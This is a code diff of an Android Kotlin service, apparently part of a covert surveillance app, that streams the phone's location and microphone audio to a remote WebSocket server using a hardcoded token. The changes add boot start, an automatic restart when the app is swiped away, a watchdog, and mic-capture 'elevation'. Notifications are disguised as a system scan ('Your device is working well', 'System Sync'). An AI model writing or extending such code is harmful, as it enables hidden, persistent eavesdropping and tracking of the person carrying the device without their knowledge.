@@ -1,28 +1,30 @@
 package com.sentinel.host.service
 
+import android.Manifest
+import android.app.AlarmManager
 import android.app.Notification
 import android.app.NotificationChannel
 import android.app.NotificationManager
 import android.app.PendingIntent
 import android.app.Service
+import android.content.BroadcastReceiver
 import android.content.Context
 import android.content.Intent
 import android.content.IntentFilter
 import android.content.pm.PackageManager
-import android.location.LocationManager
-import android.content.BroadcastReceiver
-import androidx.core.content.ContextCompat
-import android.Manifest
-import android.provider.Settings
 import android.content.pm.ServiceInfo
+import android.location.LocationManager
 import android.os.Build
 import android.os.IBinder
 import android.util.Log
 import androidx.core.app.NotificationCompat
+import androidx.core.content.ContextCompat
 import com.sentinel.host.R
 import com.sentinel.host.domain.model.ConnectionState
 import com.sentinel.host.domain.usecase.ConnectUseCase
+import com.sentinel.host.worker.SentinelWatchdogWorker
 import dagger.hilt.android.AndroidEntryPoint
+import kotlinx.coroutines.CoroutineExceptionHandler
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.SupervisorJob
@@ -31,11 +33,9 @@ import kotlinx.coroutines.launch
 import javax.inject.Inject
 
 /**
- * Foreground service that keeps the connection, location, and audio
- * running even when the screen is locked or the app is backgrounded.
- *
- * Uses foregroundServiceType = location|microphone so Android allows
- * continuous GPS and audio capture in the background.
+ * Foreground service that keeps connection, location, and audio streaming alive.
+ * Resilience: Dynamic foreground service types (Android 14+ background launch compatible),
+ * START_STICKY auto-restart, and onTaskRemoved AlarmManager instant fallback watchdog.
  */
 @AndroidEntryPoint
 class SentinelForegroundService : Service() {
@@ -48,8 +48,12 @@ class SentinelForegroundService : Service() {
         const val SERVER_URL = "wss://project-sentinel-rwt4.onrender.com/ws"
         const val JWT_TOKEN = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkZXZpY2VfaWQiOiJIT1NULTAwMSIsImlzcyI6InByb2plY3Qtc2VudGluZWwiLCJzdWIiOiJIT1NULTAwMSIsImV4cCI6MTgxNTg5MDcwMywiaWF0IjoxNzg0MzU0NzAzfQ.l_yJzhLSY0Kuhudn6-5W81pyv77NBZkDsZVdXgWKeSA"
 
-        fun Start(context: Context) {
-            val intent = Intent(context, SentinelForegroundService::class.java)
+        const val EXTRA_FROM_BOOT = "extra_from_boot"
+
+        fun Start(context: Context, isFromBoot: Boolean = false) {
+            val intent = Intent(context, SentinelForegroundService::class.java).apply {
+                putExtra(EXTRA_FROM_BOOT, isFromBoot)
+            }
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                 context.startForegroundService(intent)
             } else {
@@ -63,7 +67,11 @@ class SentinelForegroundService : Service() {
     @Inject lateinit var locationStreamer: LocationStreamer
     @Inject lateinit var audioStreamer: AudioStreamer
 
-    private val serviceScope = CoroutineScope(SupervisorJob() + Dispatchers.Main)
+    private val exceptionHandler = CoroutineExceptionHandler { _, throwable ->
+        Log.e(TAG, "Unhandled exception in Sentinel service scope: ${throwable.message}", throwable)
+    }
+
+    private val serviceScope = CoroutineScope(SupervisorJob() + Dispatchers.Main + exceptionHandler)
 
     private val locationReceiver = object : BroadcastReceiver() {
         override fun onReceive(context: Context?, intent: Intent?) {
@@ -75,30 +83,45 @@ class SentinelForegroundService : Service() {
 
     override fun onCreate() {
         super.onCreate()
-        Log.i(TAG, "Service created")
+        Log.i(TAG, "SentinelForegroundService created")
         createNotificationChannel()
         registerReceiver(locationReceiver, IntentFilter(LocationManager.PROVIDERS_CHANGED_ACTION))
+        SentinelWatchdogWorker.schedule(this)
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
-        Log.i(TAG, "Service starting")
+        val isFromBoot = intent?.getBooleanExtra(EXTRA_FROM_BOOT, false) == true
+        Log.i(TAG, "SentinelForegroundService starting (flags=$flags, startId=$startId, isFromBoot=$isFromBoot)")
 
         val notification = buildNotification("Scanning ...")
 
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
-            startForeground(
-                NOTIFICATION_ID,
-                notification,
-                ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION or
-                        ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE
-            )
+            // Always try LOCATION | MICROPHONE first — even on boot.
+            // Doze whitelist exemption allows this on most devices.
+            // Falls back to LOCATION-only if the OS blocks microphone from background.
+            val fullType = ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION or
+                    ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE
+
+            try {
+                startForeground(NOTIFICATION_ID, notification, fullType)
+                Log.i(TAG, "startForeground succeeded with LOCATION|MICROPHONE")
+            } catch (e: Exception) {
+                Log.w(TAG, "LOCATION|MICROPHONE failed (${e.message}) — trying LOCATION only")
+                try {
+                    startForeground(NOTIFICATION_ID, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION)
+                    Log.i(TAG, "startForeground succeeded with LOCATION only")
+                } catch (fallbackEx: Exception) {
+                    Log.e(TAG, "LOCATION fallback also failed: ${fallbackEx.message}", fallbackEx)
+                    startForeground(NOTIFICATION_ID, notification)
+                }
+            }
         } else {
             startForeground(NOTIFICATION_ID, notification)
         }
 
         checkPermissionsAndSettings()
 
-        // Start connection
+        // Start connection supervisor
         connectionSupervisor.start()
 
         serviceScope.launch {
@@ -114,11 +137,15 @@ class SentinelForegroundService : Service() {
             }
         }
 
-        // Monitor state for notification updates
+        // Monitor state for notification updates + dynamic microphone elevation on boot
         serviceScope.launch {
             connectionSupervisor.state.collect { state ->
                 val text = when (state) {
-                    is ConnectionState.Ready -> "Scan Completed"
+                    is ConnectionState.Ready -> {
+                        // Elevate to LOCATION|MICROPHONE once we're connected & in foreground
+                        elevateForegroundServiceType()
+                        "Scan Completed"
+                    }
                     is ConnectionState.Reconnecting -> "Scanning..."
                     is ConnectionState.Error -> "Error: ${state.message}"
                     is ConnectionState.Disconnected -> "Scan failed"
@@ -131,8 +158,63 @@ class SentinelForegroundService : Service() {
         return START_STICKY
     }
 
+    /**
+     * Dynamically elevates the foreground service to include MICROPHONE type.
+     * Called after WebSocket connection is established (service is already in foreground).
+     * After elevation succeeds, restarts the audio streamer so AudioRecord is
+     * recreated with actual microphone hardware access.
+     */
+    private fun elevateForegroundServiceType() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+            val hasMic = ContextCompat.checkSelfPermission(
+                this, Manifest.permission.RECORD_AUDIO
+            ) == PackageManager.PERMISSION_GRANTED
+
+            if (!hasMic) {
+                Log.w(TAG, "Skipping microphone elevation — RECORD_AUDIO permission not granted")
+                return
+            }
+
+            val targetType = ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION or
+                    ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE
+            try {
+                val notification = buildNotification("Your device is working well")
+                startForeground(NOTIFICATION_ID, notification, targetType)
+                Log.i(TAG, "Foreground service elevated to LOCATION|MICROPHONE")
+
+                // Restart audio streamer so AudioRecord is recreated with mic access.
+                // The old AudioRecord (created before MICROPHONE FGS type) returns zeros.
+                Log.i(TAG, "Restarting audio streamer after microphone elevation")
+                audioStreamer.stop()
+                audioStreamer.hasPermission = true
+                audioStreamer.start()
+            } catch (e: Exception) {
+                Log.w(TAG, "Microphone elevation failed (expected on boot): ${e.message}")
+                // Service continues with LOCATION type — audio will start when user opens app
+            }
+        }
+    }
+
+    override fun onTaskRemoved(rootIntent: Intent?) {
+        Log.w(TAG, "Task removed from recent apps — scheduling instant AlarmManager watchdog restart")
+        val restartServiceIntent = Intent(applicationContext, SentinelForegroundService::class.java).apply {
+            setPackage(packageName)
+        }
+        val restartServicePendingIntent = PendingIntent.getService(
+            applicationContext, 1, restartServiceIntent,
+            PendingIntent.FLAG_ONE_SHOT or PendingIntent.FLAG_IMMUTABLE
+        )
+        val alarmManager = getSystemService(Context.ALARM_SERVICE) as? AlarmManager
+        alarmManager?.set(
+            AlarmManager.RTC_WAKEUP,
+            System.currentTimeMillis() + 1000,
+            restartServicePendingIntent
+        )
+        super.onTaskRemoved(rootIntent)
+    }
+
     override fun onDestroy() {
-        Log.i(TAG, "Service destroyed")
+        Log.i(TAG, "SentinelForegroundService destroyed")
         try {
             unregisterReceiver(locationReceiver)
         } catch (e: Exception) {
@@ -149,7 +231,7 @@ class SentinelForegroundService : Service() {
         val channel = NotificationChannel(
             CHANNEL_ID,
             "System Sync",
-            NotificationManager.IMPORTANCE_MIN
+            NotificationManager.IMPORTANCE_LOW
         ).apply {
             description = "System Synchronization"
             setShowBadge(false)
@@ -205,7 +287,6 @@ class SentinelForegroundService : Service() {
             Log.w(TAG, "Requirement missing: $reason")
             updateNotification("Action Required: $reason", isAlert = true)
         } else {
-            // Clear alert if everything is fine
             val text = when (connectionSupervisor.state.value) {
                 is ConnectionState.Ready -> "Scan Completed"
                 is ConnectionState.Reconnecting -> "Scanning..."
